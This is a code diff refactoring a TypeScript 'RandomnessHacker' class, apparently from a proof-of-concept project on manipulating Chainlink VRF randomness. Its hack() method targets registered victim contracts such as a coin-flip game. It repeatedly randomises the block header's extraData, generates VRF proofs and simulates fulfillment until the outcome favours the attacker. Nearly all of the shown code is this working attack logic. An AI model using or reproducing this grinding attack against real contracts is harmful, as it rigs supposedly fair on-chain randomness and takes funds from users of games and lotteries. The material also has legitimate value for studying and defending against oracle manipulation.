@@ -3,41 +3,24 @@
 import VM from 'ethereumjs-vm'
 import Block from 'ethereumjs-block'
 import GanacheGethApiDouble from 'ganache-core/lib/subproviders/geth_api_double'
-import { BigNumber, utils } from 'ethers'
+import { BigNumber } from '@ethersproject/bignumber'
+import { randomBytes } from '@ethersproject/random'
+import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
+import { VictimKind, Victim, ResultChecker } from './type'
 import { IChainlink } from '../chainlink'
-import {
-  RandomnessRequestLogData,
-  VictimKind,
-  Victim,
-  ResultChecker,
-} from './type'
+import { RandomnessRequest } from '../chainlink/type'
 import Flipcoin from './flipcoin'
 import {
   hexToBuffer,
   bufferToHex,
-  decodeData,
-  encodeCalldata,
   genTxOptsFromRandom,
   copyVm,
-  Log,
 } from '../../util/ethereum'
-import { FN_SIG_FULFILL_RANDOMNESS_REQUEST } from '../../util/constant'
+import { ADDRESS_VRF_COORDINATOR } from '../../util/constant'
 import logger from '../../util/logger'
 
 class RandomnessHacker {
-  static decodeLogData(data: string): RandomnessRequestLogData {
-    const [keyHash, preSeed, senderAddress, fee, requestId] = decodeData(
-      ['bytes32', 'uint256', 'address', 'uint256', 'bytes32'],
-      data,
-    )
-    return {
-      keyHash,
-      preSeed: utils.hexZeroPad(preSeed, 32),
-      senderAddress,
-      fee,
-      requestId,
-    }
-  }
+  static logger = logger.child({ prefix: RandomnessHacker.name })
 
   static async fulfillRandomness(victimBlock: Block, vm: VM, proof: string) {
     const nextHeader = new Block.Header()
@@ -61,8 +44,13 @@ class RandomnessHacker {
     }
     await vm.runTx(
       await genTxOptsFromRandom(
-        encodeCalldata(FN_SIG_FULFILL_RANDOMNESS_REQUEST, ['bytes'], [proof]),
-        IChainlink.ADDRESS_VRF_COORDINATOR,
+        vrfCoordinatorFactory.interface.encodeFunctionData(
+          vrfCoordinatorFactory.interface.getFunction(
+            'fulfillRandomnessRequest',
+          ),
+          [proof],
+        ),
+        ADDRESS_VRF_COORDINATOR,
         vm.opts.common,
         new Block([nextHeader, [], []]),
       ),
@@ -92,33 +80,29 @@ class RandomnessHacker {
     }
   }
 
-  async hack(vm: VM, header, randomnessRequestLog: Log) {
-    const { address, data } = randomnessRequestLog
-    if (address !== IChainlink.ADDRESS_VRF_COORDINATOR) {
+  async hack(vm: VM, randomnessRequest: RandomnessRequest) {
+    if (randomnessRequest.event.keyHash !== this.chainlink.keyHash()) {
       return
     }
 
-    const logData = RandomnessHacker.decodeLogData(data)
-    if (logData.keyHash !== this.chainlink.keyHash()) {
-      return
-    }
-
-    const victim = this.victims[logData.senderAddress]
+    const victim = this.victims[randomnessRequest.event.senderAddress]
     if (!victim) {
       return
     }
 
-    logger.info(
+    const { header } = randomnessRequest.block
+    let attempCount = 0
+    RandomnessHacker.logger.info(
       `start to hack victim, address: ${victim.address}, kind: ${victim.kind}`,
     )
-    let attempCount = 0
+
     while (true) {
       attempCount += 1
-      header.extraData = Buffer.from(utils.randomBytes(32))
-      logger.info(`try hash: ${bufferToHex(header.hash())}`)
+      header.extraData = Buffer.from(randomBytes(32))
+      RandomnessHacker.logger.info(`try hash: ${bufferToHex(header.hash())}`)
 
       const { packedForContractInput: proof } = this.chainlink.generateProof(
-        logData.preSeed,
+        randomnessRequest.event.preSeed,
         header.hash().toString('hex'),
         BigNumber.from(header.number).toNumber(),
       )
@@ -135,14 +119,14 @@ class RandomnessHacker {
           copyVm(vm),
           futureVm,
           victim,
-          logData,
+          randomnessRequest,
         )
       ) {
         break
       }
     }
 
-    logger.info(
+    RandomnessHacker.logger.info(
       `successfully hacked with ${attempCount} attemp, hash: ${bufferToHex(
         header.hash(),
       )}`,
